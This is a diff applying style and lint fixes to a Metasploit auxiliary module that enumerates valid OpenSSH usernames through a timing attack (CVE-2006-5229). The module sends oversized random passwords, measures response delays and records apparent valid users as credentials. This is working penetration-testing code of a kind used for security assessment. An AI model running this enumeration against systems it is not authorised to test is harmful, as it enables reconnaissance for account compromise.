@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,7 +8,6 @@ require 'msf/core'
 require 'net/ssh'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::CommandShell
@@ -15,21 +15,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'SSH Username Enumeration',
-      'Description' => %q{
-        This module uses a time-based attack to enumerate users on an OpenSSH server.
-        On some versions of OpenSSH under some configurations, OpenSSH will return a
-        "permission denied" error for an invalid user faster than for a valid user.
-      },
-      'Author'      => ['kenkeiras'],
-      'References'  =>
-       [
-         ['CVE',   '2006-5229'],
-         ['OSVDB', '32721'],
-         ['BID',   '20418']
-       ],
-      'License'     => MSF_LICENSE
-    ))
+                      'Name'        => 'SSH Username Enumeration',
+                      'Description' => %q(
+                        This module uses a time-based attack to enumerate users on an OpenSSH server.
+                        On some versions of OpenSSH under some configurations, OpenSSH will return a
+                        "permission denied" error for an invalid user faster than for a valid user.
+                      ),
+                      'Author'      => ['kenkeiras'],
+                      'References'  =>
+                       [
+                         ['CVE',   '2006-5229'],
+                         ['OSVDB', '32721'],
+                         ['BID',   '20418']
+                       ],
+                      'License'     => MSF_LICENSE))
 
     register_options(
       [
@@ -39,22 +38,22 @@ class MetasploitModule < Msf::Auxiliary
                     [true, 'File containing usernames, one per line', nil]),
         OptInt.new('THRESHOLD',
                    [true,
-                   'Amount of seconds needed before a user is considered ' \
-                   'found', 10])
+                    'Amount of seconds needed before a user is considered ' \
+                    'found', 10])
       ], self.class
     )
 
     register_advanced_options(
       [
         OptInt.new('RETRY_NUM',
-                   [true , 'The number of attempts to connect to a SSH server' \
+                   [true, 'The number of attempts to connect to a SSH server' \
                    ' for each user', 3]),
         OptInt.new('SSH_TIMEOUT',
                    [false, 'Specify the maximum time to negotiate a SSH session',
-                   10]),
+                    10]),
         OptBool.new('SSH_DEBUG',
                     [false, 'Enable SSH debugging output (Extreme verbosity!)',
-                    false])
+                     false])
       ]
     )
   end
@@ -75,23 +74,23 @@ class MetasploitModule < Msf::Auxiliary
   def check_false_positive(ip)
     user = Rex::Text.rand_text_alphanumeric(8)
     result = attempt_user(user, ip)
-    return(result == :success)
+    (result == :success)
   end
 
   def check_user(ip, user, port)
     pass = Rex::Text.rand_text_alphanumeric(64_000)
     factory = ssh_socket_factory
     opt_hash = {
-      :auth_methods  => ['password', 'keyboard-interactive'],
-      :port          => port,
-      :use_agent     => false,
-      :password      => pass,
-      :config        => false,
-      :proxy         => factory,
-      :non_interactive => true
+      auth_methods: ['password', 'keyboard-interactive'],
+      port: port,
+      use_agent: false,
+      password: pass,
+      config: false,
+      proxy: factory,
+      non_interactive: true
     }
 
-    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+    opt_hash[:verbose] = :debug if datastore['SSH_DEBUG']
 
     start_time = Time.new
 
@@ -117,7 +116,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def do_report(ip, user, port)
+  def do_report(ip, user, _port)
     service_data = {
       address: ip,
       port: rport,
@@ -129,12 +128,12 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
       origin_type: :service,
       module_fullname: fullname,
-      username: user,
+      username: user
     }.merge(service_data)
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
@@ -142,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # Because this isn't using the AuthBrute mixin, we don't have the
   # usual peer method
-  def peer(rhost=nil)
+  def peer(rhost = nil)
     "#{rhost}:#{rport} - SSH -"
   end
 
@@ -158,9 +157,9 @@ class MetasploitModule < Msf::Auxiliary
     attempt_num = 0
     ret = nil
 
-    while attempt_num <= retry_num and (ret.nil? or ret == :connection_error)
+    while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error))
       if attempt_num > 0
-        Rex.sleep(2 ** attempt_num)
+        Rex.sleep(2**attempt_num)
         vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
       end
 
@@ -190,8 +189,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     else
       print_status "#{peer(ip)} Starting scan"
-      user_list.each{ |user| show_result(attempt_user(user, ip), user, ip) }
+      user_list.each { |user| show_result(attempt_user(user, ip), user, ip) }
     end
   end
-
 end
